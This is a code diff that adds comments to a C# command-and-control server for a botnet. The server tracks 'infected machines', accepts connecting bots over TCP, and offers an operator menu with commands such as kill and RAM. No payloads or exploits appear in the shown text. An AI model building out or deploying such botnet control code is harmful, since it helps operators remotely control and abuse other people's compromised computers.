@@ -22,14 +22,17 @@ namespace Server.CnC_Server
         private readonly int ServerPort;
         private TcpListener ServerListener;
 
+        // This list represent the bots that are currently active
         private static List<Infected_Machine> Bots = new List<Infected_Machine>();
 
+        // This dictionary represent all the available analyzes
         private static Dictionary<string, Analysis> Analyzes = new Dictionary<string, Analysis>(StringComparer.CurrentCultureIgnoreCase)
         {
             { ReflectionExtensions.GetAttribute<AnalysisNameAttribute>(typeof(NumberOfProcessesLowerThen_Analysis)).AnalysisName, new NumberOfProcessesLowerThen_Analysis() },
             { ReflectionExtensions.GetAttribute<AnalysisNameAttribute>(typeof(RamConsumptionLowerThen_Analysis)).AnalysisName, new RamConsumptionLowerThen_Analysis() }
         };
 
+        // This dictionary represent all the available commands
         private static Dictionary<string, Command> Commands = new Dictionary<string, Command>(StringComparer.CurrentCultureIgnoreCase)
         {
             { ReflectionExtensions.GetAttribute<CommandNameAttribute>(typeof(Kill_Command)).CommandName, new Kill_Command() },
@@ -38,6 +41,7 @@ namespace Server.CnC_Server
             { ReflectionExtensions.GetAttribute<CommandNameAttribute>(typeof(Ram_Command)).CommandName, new Ram_Command() }
         };
 
+        // This dictionary represent all the available options
         private static Dictionary<string, Option> Options = new Dictionary<string, Option>(StringComparer.CurrentCultureIgnoreCase)
         {
             { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintBots_Option)).OptionName, new PrintBots_Option(Bots) },
@@ -52,6 +56,8 @@ namespace Server.CnC_Server
         {
             this.ServerPort = serverPort;
             this.ServerListener = null;
+
+            // Add the help option (can't be added from dictionary constructor beacuse it requires the dictionary itself)
             Options.Add(ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(Help_Option)).OptionName, new Help_Option(Options));
         }
 
@@ -59,6 +65,7 @@ namespace Server.CnC_Server
         {
             try
             {
+                // Start a new listening task to receive new bots
                 Task task = Task.Factory.StartNew(() =>
                 {
                     Listen();
@@ -68,6 +75,7 @@ namespace Server.CnC_Server
                     }
                 });
 
+                // Start the CLI menu, receive options from user, parse them and run them
                 string CurrentOption = string.Empty;
                 Options[ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(Help_Option)).OptionName].Run();
                 Console.Write("\n>>> ");
@@ -86,6 +94,9 @@ namespace Server.CnC_Server
             }
         }
 
+        /// <summary>
+        /// Start a new tcplistener on the server port for new bots
+        /// </summary>
         private void Listen()
         {
             try
@@ -100,6 +111,9 @@ namespace Server.CnC_Server
             }
         }
 
+        /// <summary>
+        /// Accept a new bot that was connected, receive his listening commands port and add the bot to the bot list
+        /// </summary>
         private void AcceptBot()
         {
             try
@@ -127,13 +141,19 @@ namespace Server.CnC_Server
             }
         }
 
+        /// <summary>
+        /// Receive selected option, parse it and if it's valid then send it to the runOption function
+        /// </summary>
+        /// <param name="option">The full received option</param>
         private void parseOption(string option)
         {
+            // Split the input from user and check that is valid
             string[] splitedOption = option.Split(' ');
             
             if(splitedOption.Length > 0 && splitedOption.Length < 4
                 && Options.ContainsKey(splitedOption[0]))
             {
+                // Send the input to the runOption method
                 runOption(splitedOption[0], splitedOption.Skip(1).ToArray());
                 return;
             }
@@ -145,8 +165,10 @@ namespace Server.CnC_Server
         {
             try
             {
+                // Check if the arguments received matched the option arguments
                 if (Options[optionName].ParseArguments(arguments))
                 {
+                    // If everything is valid, run the option selected
                     Options[optionName].Run();
                 }
                 else
